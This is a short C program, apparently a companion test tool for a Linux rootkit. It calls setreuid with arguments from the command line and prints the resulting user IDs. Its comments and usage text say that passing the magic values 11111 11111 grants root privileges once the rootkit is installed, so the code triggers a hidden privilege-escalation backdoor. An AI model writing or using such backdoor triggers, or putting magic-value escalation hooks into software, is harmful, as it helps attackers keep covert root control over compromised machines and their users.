#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

/*
 * gcc setreuid_test.c -o setreuid_test
 * ./setreuid_test [ARG1] [ARG2]
 * ./setreuid_test 11111 11111 for root privileges when rootkit is installed
 */

int main(int argc, char* argv[]) {

    if (argc <= 2) {
        printf("usage: ssetreuid_test [ruid] [euid]\n");
        printf("can get root privileges with ssetreuid_test 11111 11111\n");
        return -1;
    }

    int x = setreuid(atoi(argv[1]), atoi(argv[2]));
    if (x != 0) perror("Error");

    printf("ruid: %d, euid: %d\n", getuid(), geteuid());

    return 0;
}
